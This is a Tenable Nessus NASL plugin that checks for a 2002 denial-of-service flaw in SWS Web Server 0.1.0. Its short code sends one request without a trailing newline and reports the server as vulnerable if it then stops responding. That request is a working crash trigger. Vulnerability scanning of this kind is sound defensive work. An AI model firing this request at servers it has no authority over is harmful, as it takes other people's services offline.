#
# (C) Tenable Network Security, Inc.
#

# Modifications by rd:
#	- Removed the numerous (and slow) calls to send() and recv()
#	  because the original exploit states that sending just one
#	  request will crash the server
#
########################
# References:
########################
#
# Message-Id: <200209021802.g82I2Vd48012@mailserver4.hushmail.com>
# Date: Mon, 2 Sep 2002 11:02:31 -0700
# To: vulnwatch@vulnwatch.org
# From: saman@hush.com
# Subject: [VulnWatch] SWS Web Server v0.1.0 Exploit
#
########################
#
# Vulnerable:
# SWS Web Server v0.1.0
#

include("compat.inc");

if(description)
{
 script_id(11171);
 script_version("$Revision: 1.15 $");

 script_cve_id("CVE-2002-2370");
 script_bugtraq_id(5664);
 script_xref(name:"OSVDB", value:"55111");
 
 script_name(english:"SWS Web Server Unfinished Line Remote DoS");
 
 script_set_attribute(
  attribute:"synopsis",
  value:string(
   "The remote web server is prone to a denial of service attack."
  )
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "The SWS web server running on this port crashes when it receives a\n",
   "request that doesn't end in a newline. \n",
   "\n",
   "An unauthenticated remote attacker can exploit this vulnerability to\n",
   "disable the service."
  )
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0100.html"
 );
 script_set_attribute(
  attribute:"solution", 
  value:string(
   "Unknown at this time."
  )
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_set_attribute(
  attribute:"vuln_publication_date", 
  value:"2002/09/02"
 );
 script_set_attribute(
  attribute:"plugin_publication_date", 
  value:"2002/11/27"
 );
 script_end_attributes();
 
 script_summary(english:"SWS web server crashes when unfinished line is sent");
 script_category(ACT_DENIAL);

 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "httpver.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

r = http_send_recv_buf(port: port, data:"|Nessus|");
if(http_is_dead(port:port, retry:3)) security_warning(port);
